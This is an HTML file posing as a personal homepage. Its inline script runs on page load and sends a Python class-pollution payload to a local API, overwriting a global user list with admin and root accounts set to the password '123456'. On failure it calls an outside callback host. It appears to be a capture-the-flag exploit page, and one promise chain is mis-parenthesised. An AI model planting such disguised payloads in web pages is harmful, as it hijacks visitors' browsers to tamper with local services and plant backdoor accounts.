<!DOCTYPE html>
<html lang="en">
<head>
    <meta charset="UTF-8">
    <title>sky-tears</title>
</head>
<body>
    <h1>sky-tears的个人主页</h1>
    <h1>Hello ~</h1>
    <script>
    var payload = {
    "__class__": {
        "__init__": {
            "__globals__": {
                "USERS": [
                    {
                        "username": "admin",
                        "password": "123456"
                    },
                    {
                        "username": "root",
                        "password": "123456"
                    }
                ]
            }
        }
    }
};
    fetch('https://127.0.0.1/api', {
    method: 'POST',
    headers: {
        'Content-Type': 'application/json', // 设置请求头，根据需求调整
    },
    body: JSON.stringify(payload) // 请求体，需转换为字符串
})
    .then(response => {
        if (!response.ok) {
            throw new Error('Network response was not ok');
        }
        return response.json(); // 或 response.text() / response.blob() 视情况而定
    })
    .then(data => console.log(data)
    .catch(error => {
    fetch('https://error.b182oj.ceye.io/api', {
    method: 'GET', // 默认是 GET，可以省略
    headers: {
        'Accept': 'application/json', // 根据 API 要求设置 Accept 类型
    }
})
    .then(response => {
        if (!response.ok) {
            throw new Error(`HTTP error! status: ${response.status}`);
        }
        return response.json(); // 解析 JSON 响应
    })
    .then(data => console.log(data))
    .catch(error => console.error('Error:', error));
    });
    </script>
</body>
</html>
